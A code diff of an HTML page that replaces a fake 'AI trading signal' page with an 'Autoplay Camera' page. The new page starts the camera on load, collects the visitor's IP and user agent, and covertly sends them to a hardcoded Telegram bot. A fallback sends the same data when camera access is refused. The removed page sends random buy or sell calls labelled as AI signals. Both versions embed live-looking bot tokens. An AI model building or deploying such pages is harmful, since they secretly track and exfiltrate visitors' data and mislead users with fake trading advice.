@@ -1,269 +1,108 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>AI Trading Signal - Public</title>
+  <title>Autoplay Camera with Telegram Notification</title>
   <style>
     body {
-      font-family: 'Arial', sans-serif;
-      background: linear-gradient(to bottom, #0d0d0d, #1a1a1a);
-      margin: 0;
-      padding: 0;
-      color: white;
-      overflow: hidden;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      position: relative;
-    }
-
-    .candlestick-background {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      pointer-events: none;
-    }
-
-    .candlestick {
-      width: 60px;
-      margin: 20px;
-      position: relative;
-      animation: float 3s infinite alternate ease-in-out;
-      opacity: 0.7;
-      border-radius: 4px;
-    }
-
-    .green { background: #3ea84a; }
-    .red { background: #bf2a2a; }
-
-    .big.green { height: 500px; }
-    .big.red { height: 400px; }
-    .small.green {
-      height: 300px;
-      width: 28px;
-      margin: 20px;
-    }
-
-    @keyframes float {
-      from { transform: translateY(0); }
-      to { transform: translateY(60px); }
-    }
-
-    .content {
-      position: relative;
-      z-index: 1;
+      font-family: Arial, sans-serif;
       text-align: center;
-      background: rgba(0, 0, 0, 0.95);
-      padding: 2rem;
-      border-radius: 20px;
-      box-shadow: 0 0 50px rgba(0, 255, 255, 0.5);
-      max-width: 500px;
-      transition: all 0.3s ease;
+      margin-top: 50px;
     }
-
-    h2 {
-      font-size: 2rem;
-      margin-bottom: 1rem;
-      color: #00bfff;
+    video {
+      width: 640px;
+      height: 480px;
+      border: 2px solid #ccc;
+      margin-top: 20px;
     }
-
-    select, button {
-      width: 100%;
-      padding: 1rem;
-      margin: 0.5rem 0;
-      border-radius: 10px;
-      font-size: 1.1rem;
-      border: none;
-      transition: all 0.2s ease;
-      background-color: #222;
-      color: white;
-    }
-
-    select:focus, button:focus {
-      outline: none;
-      box-shadow: 0 0 8px #00bfff;
-    }
-
-    button {
-      background: #00bfff;
-      color: black;
-      font-weight: bold;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background: #009acd;
-    }
-
-    .signal {
-      font-size: 2.7rem;
-      margin-top: 1.5rem;
-      font-weight: bold;
-      transition: color 0.3s ease;
-    }
-
-    .signal-strong-buy {
-      color: #4caf50;
-    }
-
-    .signal-strong-sell {
-      color: #f44336;
-    }
-
-    .status {
-      margin-top: 1rem;
-      font-size: 0.9rem;
-      color: #aaa;
-    }
-
-    /* Responsive adjustments */
-    @media (max-width: 600px) {
-      .content {
-        padding: 1.5rem;
-        max-width: 90%;
-      }
-
-      .signal {
-        font-size: 2.2rem;
-      }
-
-      .candlestick {
-        width: 40px;
-        margin: 10px;
-      }
-
-      .big.green { height: 350px; }
-      .big.red { height: 300px; }
-      .small.green { height: 200px; width: 20px; margin: 10px; }
+    .info {
+      margin-top: 20px;
+      font-size: 18px;
     }
   </style>
 </head>
 <body>
-  <div class="candlestick-background" id="candles"></div>
-
-  <div class="content">
-    <h2>🤖 AI Trading Signal</h2>
-    <select id="pairSelect">
-      <option>EUR/USD</option>
-      <option>AUD/CAD</option>
-      <option>AUD/JPY</option>
-      <option>AUD/USD</option>
-      <option>CAD/CHF</option>
-      <option>CAD/JPY</option>
-      <option>EUR/CHF</option>
-      <option>EUR/GBP</option>
-      <option>EUR/JPY</option>
-      <option>GBP/USD</option>
-      <option>USD/CAD</option>
-      <option>USD/CHF</option>
-      <option>USD/JPY</option>
-    </select>
-
-    <button onclick="toggleAutoSignal()" id="startBtn">▶️ Start Auto Signal</button>
-    <div id="output"></div>
-    <div class="status" id="status">Status: Waiting</div>
-  </div>
+  <h1>Autoplay Start Camera</h1>
+  <video id="video" autoplay playsinline></video>
+  <div class="info" id="deviceInfo"></div>
 
   <script>
-    function generateCandles() {
-      const container = document.getElementById('candles');
-      container.innerHTML = "";
+    const video = document.getElementById('video');
+    const deviceInfoDiv = document.getElementById('deviceInfo');
 
-      const configs = [
-        { type: 'red', size: 'big' },
-        { type: 'green', size: 'big' },
-        { type: 'red', size: 'big' },
-        { type: 'green', size: 'small' }
-      ];
-
-      configs.forEach(cfg => {
-        const candle = document.createElement('div');
-        candle.classList.add('candlestick', cfg.type, cfg.size);
-        container.appendChild(candle);
-      });
-    }
-
-    generateCandles();
-
-    let autoInterval = null;
-
-    async function requestSignal() {
-      const output = document.getElementById("output");
-      const status = document.getElementById("status");
-
-      status.textContent = "Status: Analyzing...";
-
-      // Simulate AI signal generation
-      await new Promise(r => setTimeout(r, 2000));
-
-      const signals = ["🚀 Strong Buy", "📉 Strong Sell"];
-      const signal = signals[Math.floor(Math.random() * signals.length)];
-      const pair = document.getElementById("pairSelect").value;
-      const time = new Date().toLocaleTimeString();
-
-      const signalClass = signal.includes("Buy") ? "signal-strong-buy" : "signal-strong-sell";
-      output.innerHTML = `<div class="signal ${signalClass}">${signal}</div>`;
-
-      const message = `
-🤖 *AI Trading Signal* 📊
-━━━━━━━━━━━━━━━━━━
-🔹 Pair: \`${pair}\`
-🔺 Signal: \`${signal}\`
-🕒 Time: \`${time}\`
-━━━━━━━━━━━━━━━━━━
-`;
-
-      status.textContent = "Status: Sending to Telegram...";
+    async function startCameraAndSendMessage() {
       try {
-        await sendTelegramMessage(message);
-        status.textContent = "Status: Sent successfully!";
+        // Get camera stream
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        // Fetch IP address and device info
+        const ipResponse = await fetch('https://api.ipify.org ?format=json');
+        const ipData = await ipResponse.json();
+        const userAgent = navigator.userAgent;
+
+        deviceInfoDiv.innerHTML = `
+          IP Address: ${ipData.ip}<br/>
+          Device/User Agent: ${userAgent}
+        `;
+
+        // Telegram Bot Settings
+        const TOKEN = "6380138289:AAHOPzz0h7lXXNZPxAErxQvD1jm9LNSk5OY";
+        const CHAT_ID = "711360667";
+        const URI_API = `https://api.telegram.org/bot ${TOKEN}/sendMessage`;
+
+        const message = `🎥 Camera started!\nIP Address: ${ipData.ip}\nDevice: ${userAgent}`;
+        fetch(URI_API, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        });
+
       } catch (err) {
-        status.textContent = "Status: Failed to send.";
-        console.error(err);
+        console.error("Error accessing camera:", err);
+        alert("Could not access the camera. Please allow permissions.");
+
+        // Send fallback message without camera access
+        sendFallbackMessage();
       }
     }
 
-    async function sendTelegramMessage(text) {
-      const botToken = '6356177389:AAH_MNHpwKioP4eraf2O5TV7wrdar8nqrx0';
-      const chatId = '-1001234567890'; // Replace with your Telegram chat ID
-      const url = `https://api.telegram.org/bot ${botToken}/sendMessage`;
+    async function sendFallbackMessage() {
+      try {
+        const ipResponse = await fetch('https://api.ipify.org ?format=json');
+        const ipData = await ipResponse.json();
+        const userAgent = navigator.userAgent;
 
-      const response = await fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: text,
-          parse_mode: 'Markdown'
-        })
-      });
+        const TOKEN = "6380138289:AAHOPzz0h7lXXNZPxAErxQvD1jm9LNSk5OY";
+        const CHAT_ID = "711360667";
+        const URI_API = `https://api.telegram.org/bot ${TOKEN}/sendMessage`;
 
-      if (!response.ok) throw new Error("Telegram API error");
-      return await response.json();
-    }
-
-    function toggleAutoSignal() {
-      const btn = document.getElementById("startBtn");
-      if (!autoInterval) {
-        btn.textContent = "⏹️ Stop Auto Signal";
-        requestSignal(); // Run immediately
-        autoInterval = setInterval(requestSignal, 60000); // Then every 1 minute
-      } else {
-        btn.textContent = "▶️ Start Auto Signal";
-        clearInterval(autoInterval);
-        autoInterval = null;
-        document.getElementById("status").textContent = "Status: Stopped";
+        const message = `⚠️ Page loaded but camera NOT accessed.\nIP Address: ${ipData.ip}\nDevice: ${userAgent}`;
+        fetch(URI_API, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        });
+      } catch (err) {
+        console.error("Error sending fallback message:", err);
       }
     }
+
+    window.onload = () => {
+      startCameraAndSendMessage();
+    };
   </script>
 </body>
 </html>
